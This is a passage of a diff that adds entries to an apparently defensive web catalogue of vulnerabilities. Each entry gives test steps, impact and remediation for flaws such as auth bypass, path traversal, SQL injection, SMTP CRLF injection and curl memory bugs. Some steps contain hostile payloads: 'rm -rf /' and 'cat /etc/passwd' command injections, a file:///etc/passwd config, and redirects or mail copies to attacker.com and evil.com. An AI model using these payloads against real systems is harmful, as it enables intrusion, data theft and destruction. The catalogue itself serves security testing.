+        <p><strong class="section-heading section-description">Description:</strong> An unrestricted pagination size parameter can lead to resource exhaustion or excessive data retrieval. An attacker can manipulate this parameter to request an extremely large number of records, potentially causing server slowdowns, denial of service, or enabling bulk data exfiltration. The application&#x27;s backend might struggle to process and deliver such a large result set.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Authenticate as a user with access to a log viewer or paginated resource listing.</li>
+<li>Modify the pagination size parameter in the request URL. For example, change the URL to <code>&lt;TARGET_URL&gt;?setPerPage=&lt;PAYLOAD&gt;</code>.</li>
+<li>Set <code>&lt;PAYLOAD&gt;</code> to a very large number, such as <code>1000000000</code>.</li>
+<li>Observe the server&#x27;s response time and resource usage. Check if the server returns an error, crashes, or experiences performance degradation.</li>
+<li>Verify that the application does not appropriately limit or validate the <code>setPerPage</code> parameter.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Denial of service, excessive bandwidth consumption, potential data exfiltration.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement server-side validation and capping of pagination parameters. Limit the maximum number of records that can be retrieved per request. Use pagination techniques efficiently to minimize the load on the server and the client.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Authentication Bypass in Subscription Management</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to modify subscription details without proper authentication. It arises from a flaw in the API&#x27;s validation of user roles and permissions, potentially granting unauthorized access to sensitive data or functionalities. Exploitation can lead to significant data breaches and service disruption.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a request to the subscription management endpoint at <code>&lt;TARGET<em>URL&gt;/subscriptions/&lt;SUBSCRIPTION</em>ID&gt;</code> using the <code>PUT</code> method.</li>
+<li>In the request headers, set the <code>Authorization</code> header to a token that does not belong to the intended user or does not have the necessary permissions.</li>
+<li>In the request body, include a payload to modify the subscription details, such as <code>{&quot;plan&quot;: &quot;premium&quot;, &quot;status&quot;: &quot;active&quot;}</code>. Example payload: <code>{&quot;plan&quot;: &quot;premium&quot;, &quot;status&quot;: &quot;active&quot;}</code>.</li>
+<li>Observe the API&#x27;s response to determine if the subscription details are modified successfully despite the invalid authorization.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized modification of subscription details, potentially leading to data breaches and financial loss.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict role-based access control (RBAC) and thoroughly validate user credentials and permissions before allowing any modifications to sensitive resources. Use strong authentication mechanisms and prevent direct manipulation of user data without verification.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">FTP Path Traversal via URL Decoding</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A flaw exists in how a library handles URL-decoded paths within FTP URLs. By supplying a carefully crafted URL with encoded path segments (like %2e%2e for &quot;..&quot;), an attacker can potentially manipulate the library to issue directory change commands (CWD) to the FTP server, leading to unintended directory traversal. This vulnerability can expose sensitive files or bypass security filters.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Start a local FTP server.</li>
+<li>Create a directory structure, including files within subdirectories, on the FTP server.</li>
+<li>Craft an FTP URL containing encoded path traversal sequences, such as <code>%2e%2e</code> to represent &quot;..&quot;. For example: <code>ftp://&lt;TARGET_URL&gt;/dir//%2e%2e/testdir</code></li>
+<li>Use a tool that uses a vulnerable library to connect to the FTP server using the crafted URL. Enable trace output to observe the issued commands. For example: <code>curl --trace-ascii curl<em>trace.txt -v &quot;ftp://&lt;TARGET</em>URL&gt;/dir//%2e%2e/testdir&quot; 2&gt;&amp;1 | tee curl_stdout.txt</code></li>
+<li>Examine the trace output for unexpected <code>CWD</code> (Change Working Directory) commands.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Remote file disclosure or bypass of client-side filters, potentially leading to unauthorized access to sensitive data or system compromise.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Perform canonical path normalization (stack-based handling of &quot;.&quot; and &quot;..&quot;) after URL decoding and before splitting into path components. Reject paths attempting to traverse above the allowed root directory.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Exposed Hash in Public Repository</span>
+        <span class="card-meta-mini">
+          <span class="badge">Source Code</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> Publicly exposing cryptographic hashes in source code repositories can reveal information about the build process or internal infrastructure. This information might be leveraged by attackers to identify vulnerabilities or gain insights into the deployment environment. Proper handling and obfuscation of such sensitive data is crucial.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Examine publicly accessible source code repositories for files containing hash values.</li>
+<li>Search for instances where hash values are used in build scripts, Dockerfiles, or configuration files.</li>
+<li>Look for hashes related to dependencies, environment variables, or specific versions. For example: <code>&lt;PAYLOAD&gt;7a9b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0</code></li>
+<li>Verify that these hashes are not used to identify specific versions or to reveal internal infrastructure details.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Potential exposure of vulnerabilities, deployment environment details, and internal infrastructure.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Avoid hardcoding hashes in public repositories; use official tags or obfuscation techniques for sensitive data; ensure repositories containing such data are private.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Authentication Token Theft via Open Redirect</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An open redirect vulnerability can allow an attacker to redirect users to malicious sites after authentication, potentially leading to session hijacking or other attacks. If an authentication token is passed through the redirect, the attacker can steal this sensitive information. This allows attackers to impersonate legitimate users.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Initiate the authentication flow on the target application.</li>
+<li>Observe the callback URL parameter used during the authentication process.</li>
+<li>Construct a malicious redirect URL using the observed callback URL parameter: <code>&lt;TARGET_URL&gt;/callback?url=&lt;PAYLOAD&gt;</code>. For example: <code>https://example.com/callback?url=https://attacker.com</code>.</li>
+<li>Attempt to redirect users to the crafted malicious URL.</li>
+<li>Monitor the network traffic for any exposed authentication tokens during the redirection process.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exposure of authentication tokens leading to account takeover and potential data breach.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation and sanitization for callback URLs. Use a whitelisting approach to restrict allowed redirect destinations.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Double-Free in TLS Configuration</span>
+        <span class="card-meta-mini">
+          <span class="badge">Network</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A flaw exists where a TLS configuration object is freed twice, potentially leading to a crash or memory corruption. This occurs specifically when using a particular TLS backend (rustls) and certain conditions related to certificate verification are met. The issue arises from improper handling of the TLS configuration builder within the underlying library.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Build a curl-compatible application linked against a vulnerable version of libcurl (v8.13.0 to v8.17.0) and the rustls TLS backend.</li>
+<li>Configure the application to use a TLS backend where server certificate verification is disabled (<code>!conn_config-&gt;verifypeer</code>).</li>
+<li>Ensure that the certificate authority (CA) information or CA file is not provided.</li>
+<li>Attempt to establish a connection to <code>&lt;TARGET<em>URL&gt;</code> using the configured TLS settings. Use a payload like <code>&lt;PAYLOAD&gt;GET / HTTP/1.1\nHost: &lt;TARGET</em>URL&gt;\n\n</code> to trigger the TLS handshake.</li>
+<li>Observe the application’s behavior.  A crash or memory corruption error should occur, potentially triggered by an out-of-memory (OOM) condition during the TLS handshake.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Application crash, potential for memory corruption leading to unexpected behavior or privilege escalation if the vulnerability can be exploited to overwrite sensitive data.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Carefully review and audit TLS configuration initialization and deallocation logic, especially when using custom or less-common TLS backends.  Ensure that resources are freed only once and that proper error handling is implemented to prevent double-frees. Consider adding checks before freeing resources to prevent premature deallocation.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Double Free in SSL Session Handling</span>
+        <span class="card-meta-mini">
+          <span class="badge">Network</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves a double-free error occurring during the processing of SSL sessions. A malformed SSL session file can trigger this condition, leading to denial of service or potential exploitable behavior. The issue arises from a failure to properly reset pointers before freeing memory.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Compile a network utility with SSL session export enabled (e.g., <code>./configure --enable-debug --with-openssl --enable-static --disable-shared --enable-ssls-export</code>).</li>
+<li>Create a malformed SSL session file that triggers the vulnerable code path. The file should manipulate the content check logic at a specific location in the SSL session handling code. For example, modify the session file content as per the vulnerability&#x27;s root cause.</li>
+<li>Run the compiled utility with the malformed SSL session file: <code>&lt;NETWORK<em>UTILITY&gt; --ssl-sessions &lt;MALFORMED</em>SESSION<em>FILE&gt; &lt;TARGET</em>URL&gt;</code>.</li>
+<li>Observe a crash or unexpected behavior indicating a double-free vulnerability.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Denial of service or potential for further exploitation due to memory corruption.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Always reset pointers to NULL after freeing memory to prevent double-free vulnerabilities. Ensure proper input validation and sanitization of SSL session data.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">SQL Injection via Unvalidated Filter Connector</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An attacker can inject arbitrary SQL code into the <code>WHERE</code> clause of a database query by manipulating the connector string used to join filter conditions. This occurs when user-controlled data is unpacked directly into a query object without proper sanitization or validation, bypassing parameterized queries and leading to data exfiltration or access control bypass.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create a database query using a framework (e.g., Django ORM) that allows developers to specify connector strings for joining filter conditions.</li>
+<li>Simulate a user-supplied filter dictionary containing a <code><em>connector</code> key with a malicious payload, for example: <code>{&quot;is</em>admin&quot;: False, &quot;username&quot;: &quot;nonexistent<em>user&quot;, &quot;</em>connector&quot;: &quot;) OR 1=1 OR (&quot;}</code>.</li>
+<li>Unpack the filter dictionary into a query object.</li>
+<li>Execute the query and examine the generated SQL to confirm that the injected payload is present and executed as part of the query.</li>
+<li>Verify that the injection bypasses intended access control or filtering mechanisms.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to sensitive data, bypass of access controls, and potential denial-of-service by injecting resource-intensive SQL queries.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Validate and sanitize user-supplied input before incorporating it into SQL queries. Implement an allow-list for acceptable connector values and reject any unexpected characters or strings. Use parameterized queries to prevent SQL injection.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Missing SSH Host Key Verification</span>
+        <span class="card-meta-mini">
+          <span class="badge">Network</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The wolfSSH backend in curl, when used for SFTP, lacks server host key verification. This allows attackers to potentially intercept and modify SFTP connections without being detected.  This vulnerability arises because the backend does not check the server’s identity against a known hosts file or verify the fingerprint of the server’s public key.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Build curl with the wolfSSH backend.  Example compilation command:</li>
+</ol>
+<pre><code>   ./configure --with-wolfssh=/path/to/wolfssh --disable-shared
+   make</code></pre>
+<ol>
+<li>Verify the build includes wolfSSH: <code>./src/curl --version</code> (output should contain &quot;wolfssh/x.x.x&quot;).</li>
+<li>Attempt an SFTP connection without providing a known hosts file or fingerprint: <code>./src/curl --ssh-knownhosts /tmp/dummy sftp://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;TARGET_URL&gt;:&lt;PORT&gt;/</code></li>
+<li>Observe that the connection is established without any host key verification errors, even if an unexpected host key is presented.</li>
+<li>Attempt to use <code>--hostpubsha256</code> option: <code>./src/curl --hostpubsha256 &lt;EXAMPLE<em>SHA256</em>HASH&gt; sftp://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;TARGET_URL&gt;:&lt;PORT&gt;/</code></li>
+<li>Observe that the tool does not accept the <code>--hostpubsha256</code> argument.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can perform a man-in-the-middle attack, intercepting and potentially modifying SFTP data exchanged between the client and server without being detected.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure SFTP clients implement robust host key verification mechanisms, such as checking against a known hosts file or verifying the server&#x27;s public key fingerprint.  Use established SSH libraries with proper host key verification functionality.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Unauthorized Modification of Feature Settings</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows a user with limited privileges to modify settings for a feature (Lovable AI) within a workspace that they shouldn&#x27;t be able to control. It represents a potential for unauthorized configuration changes and disruption of service. This can be exploited by malicious users to manipulate a service&#x27;s behaviour.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Identify an API endpoint responsible for enabling or disabling a feature for new projects in a workspace, such as <code>/workspaces/&lt;workspace<em>id&gt;/tool-preferences/ai</em>gateway/enable</code>.</li>
+<li>Obtain a valid <code>&lt;workspace_id&gt;</code> for a target workspace.</li>
+<li>Using a low-privileged user account, replay the identified API request against a different workspace.</li>
+<li>To disable: <code>POST /workspaces/&lt;workspace<em>id&gt;/tool-preferences/ai</em>gateway/enable</code> with the payload <code>{ &quot;approval_preference&quot;:&quot;disable&quot; }</code>.</li>
+<li>To enable: <code>DELETE /workspaces/&lt;workspace<em>id&gt;/tool-preferences/ai</em>gateway/enable</code>.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized modification of feature settings can lead to disruption of service, unexpected behavior, and potential misuse of the application.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper access controls and authorization checks to ensure that only authorized users can modify feature settings for specific workspaces.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Improper Authorization Bypass</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An attacker can bypass authorization checks and perform actions they are not permitted to. This allows for privilege escalation and potential disruption of services. The vulnerability arises from a lack of server-side validation of user roles before allowing sensitive actions to be performed.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create two user accounts within the same workspace: one with an administrative role and one with a lower-privileged role (e.g., Editor).</li>
+<li>As the administrative user, perform an action that modifies a workspace configuration (e.g., disabling a feature).</li>
+<li>Capture the API request used by the administrative user. The request will include an authentication token (<code>&lt;OWNER_JWT&gt;</code>).</li>
+<li>Modify the captured API request, replacing the authentication token with the token of the lower-privileged user (<code>&lt;EDITOR_JWT&gt;</code>).  The request should look like this:</li>
+</ol>
+
+<pre><code>POST /workspaces/&lt;WORKSPACE_ID&gt;/tool-preferences/supabase/enable HTTP/2
+Host: &lt;TARGET_URL&gt;
+Authorization: Bearer &lt;EDITOR_JWT&gt;
+Content-Type: application/json
+
+{&quot;approval_preference&quot;:&quot;disable&quot;}</code></pre>
+<ol>
+<li>Send the modified request to the API endpoint.  Verify that the action is still successfully executed despite the lower-privileged user&#x27;s credentials.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized modification of critical workspace settings, leading to potential service disruption or data compromise.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust server-side role checking for all sensitive API endpoints to ensure that users can only perform actions they are authorized to.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Unauthorized Feature Modification</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An attacker can modify sensitive settings or features within a workspace even without the appropriate administrative privileges. This can lead to unexpected behavior, disruption of services, or unauthorized modifications to the application&#x27;s state. It represents a broken access control vulnerability.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create a workspace with at least two users: an administrator and a standard user (editor).</li>
+<li>As the administrator, disable a workspace feature through the API.</li>
+<li>Capture the API request used to disable the feature, noting the authorization token and endpoint.</li>
+<li>Replace the administrator&#x27;s authorization token in the captured request with the standard user’s token.</li>
+<li>Resend the modified API request.</li>
+<li>Observe if the feature is successfully disabled by the standard user. Example payload:</li>
+</ol>
+<pre><code>{&quot;approval_preference&quot;:&quot;disable&quot;}</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized users can disrupt workspace functionality by disabling or modifying critical features, potentially impacting all users and disrupting core services.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict server-side role checks to ensure users can only perform actions authorized by their roles. Validate user permissions before executing any sensitive API calls.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">MQTT Payload Size Overflow DoS</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An attacker can crash a client application by setting an excessively large value for the MQTT payload size, leading to a denial-of-service condition. This occurs due to a lack of input validation when calculating memory allocation sizes, resulting in an attempt to allocate an impossibly large buffer.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure an MQTT client using a library like libcurl.</li>
+<li>Set the <code>CURLOPT<em>POSTFIELDSIZE</em>LARGE</code> option to a very large value, for example, <code>0x0FFFFFFF</code>.</li>
+<li>Attempt to publish a message to an MQTT broker.</li>
+<li>Observe if the client crashes or returns an <code>CURLE<em>OUT</em>OF_MEMORY</code> error.</li>
+<li>Example Payload: <code>curl<em>easy</em>setopt(curl, CURLOPT<em>POSTFIELDSIZE</em>LARGE, 0x0FFFFFFF);</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Denial of service; the client application crashes or terminates unexpectedly when attempting to publish the oversized MQTT message.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Validate user-supplied input related to payload sizes against protocol limits. Implement overflow checks before memory allocation and cap encoded lengths to prevent exceeding resource limits.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">SMTP Command Injection via CRLF</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject arbitrary SMTP commands by crafting malicious mailbox addresses containing CRLF sequences. It&#x27;s a critical issue because it can lead to unauthorized email copying, privacy violations, and potential access control bypass.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Use <code>curl</code> to send an SMTP request to a target server at <code>&lt;TARGET_URL&gt;</code>.</li>
+<li>Include a crafted <code>MAIL FROM</code> address containing CRLF sequences to inject a malicious SMTP command.</li>
+<li>Use the following payload as an example: <code>&#x27;legit@company.com\r\nRCPT TO:&lt;attacker@evil.com&gt;&#x27;</code></li>
+<li>Use the <code>--mail-from</code> flag with the crafted payload. Example: <code>curl --url &quot;smtp://&lt;TARGET_URL&gt;&quot; --mail-from $&#x27;legit@company.com\r\nRCPT TO:&lt;attacker@evil.com&gt;&#x27; --mail-rcpt &quot;employee@company.com&quot; --upload-file message.txt</code></li>
+<li>Monitor the SMTP server&#x27;s response to observe the injected command&#x27;s execution.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized email copying, privacy violations, access control bypass, and arbitrary command injection within the SMTP protocol.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation on mailbox addresses, properly escape CRLF sequences, and apply patches to vulnerable libraries.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Arbitrary Configuration File Inclusion</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A malicious user can craft a configuration file that, when used by a program leveraging a configuration system, can lead to sensitive information disclosure or arbitrary file modification. This occurs if the program lacks proper validation when loading and processing configuration files.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create a malicious configuration file. For example, <code>echo &#x27;url = &quot;file:///etc/passwd&quot;&#x27; &gt; /tmp/malicious.config</code>.</li>
+<li>Run the program, directing it to use the malicious configuration file using a command-line option like <code>--config /tmp/malicious.config</code>.</li>
+<li>Verify that the program attempts to read the sensitive file specified in the configuration file.</li>
+<li>Verify that the program&#x27;s output redirection or other actions are controlled by the configuration file and are potentially harmful.</li>
+<li>Use payloads like <code>&lt;PAYLOAD&gt;</code> to modify file paths or URLs to test for SSRF and unauthorized access. For example, <code>echo &#x27;url = &quot;http://&lt;TARGET_URL&gt;&quot;&#x27; &gt; /tmp/malicious.config</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Potential for sensitive information disclosure (e.g., credentials, API keys), arbitrary file write, system compromise, or SSRF attacks.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation and sanitization when parsing configuration files. Use a whitelist approach, allowing only trusted file paths or parameters. Never directly execute commands or scripts from configuration files without thorough validation.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Command Injection via Shell Execution</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A vulnerability exists where user-controlled input is directly incorporated into shell commands without proper sanitization. This allows an attacker to execute arbitrary commands on the server, potentially leading to data breaches or system compromise. The issue arises from the unchecked use of shell commands using external tools.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a command that includes a malicious payload within a file path parameter.</li>
+<li>Execute the command through the vulnerable function or script.</li>
+<li>Observe if the malicious payload is executed by the shell.</li>
+<li>Example payload: <code>sha256(&quot;file.txt; rm -rf /&quot;)</code> or <code>sha256(&quot;file.txt; cat /etc/passwd&quot;)</code></li>
+<li>Attempt to inject commands by manipulating <code>&lt;PARAMETER&gt;</code> in a shell-executed function.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can execute arbitrary commands on the system, leading to data theft, system compromise, or denial of service.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Always sanitize user-controlled input before incorporating it into shell commands. Use parameterized queries or safer alternatives to shell execution whenever possible. Validate and restrict the characters allowed in user input.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Silent TLS Trust Store Hijacking</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to silently replace the trusted Certificate Authority (CA) bundle used by <code>curl</code>, enabling Man-in-the-Middle (MITM) attacks without user warning. The tool fails to inform the user that the system&#x27;s trusted certificate chain is being overridden, creating a false sense of security and allowing attackers to decrypt and manipulate HTTPS traffic.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Install a MITM proxy tool like <code>mitmproxy</code> on a test system.</li>
+<li>Export the MITM proxy&#x27;s CA certificate as the <code>CURL<em>CA</em>BUNDLE</code> environment variable: <code>export CURL<em>CA</em>BUNDLE=&lt;PATH<em>TO</em>MITM<em>PROXY</em>CA_CERT.pem&gt;</code></li>
+<li>Run <code>curl</code> to make an HTTPS request to a target website: <code>curl --proxy http://localhost:8080 &lt;TARGET_URL&gt;</code></li>
+<li>Observe the MITM proxy to confirm that HTTPS traffic from <code>&lt;TARGET_URL&gt;</code> is visible in plain text.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Complete compromise of HTTPS confidentiality and integrity, enabling attackers to intercept and manipulate sensitive data like login credentials and API keys.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Always warn the user if the CA certificate chain is being overridden, or enforce stricter controls to prevent unauthorized modification of the trust store.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Partial Path Traversal in Archive Extraction</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> Improper validation during archive extraction can allow attackers to write files outside of the intended destination directory. This occurs when the base path is normalized using <code>abspath</code>, which removes trailing slashes, enabling partial path traversal. Exploitation could lead to arbitrary file writes.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Set up a target application that handles ZIP or TAR archive extraction.</li>
+<li>Define a base extraction directory, for example, <code>/var/lib/</code>.</li>
+<li>Construct a malicious archive containing a file with a path like <code>/var/library/test.txt</code>.</li>
+<li>Attempt to extract the archive using the application&#x27;s functionality.</li>
+<li>Verify that the extracted file is written outside of the <code>/var/lib/</code> directory.</li>
+</ol>
+<ul>
+<li>Example payload: Create a ZIP archive with a file named <code>/var/library/test.txt</code> containing arbitrary content.</li>
+</ul>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Arbitrary file writes outside the intended directory, potentially leading to code execution or denial of service.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure the path traversal check includes the full, normalized path, including trailing slashes, or use a safer approach to ensure files are extracted within the intended boundaries. Consider sanitizing filenames to prevent unexpected characters.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Bot Impersonation via Predictable Bot Key</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
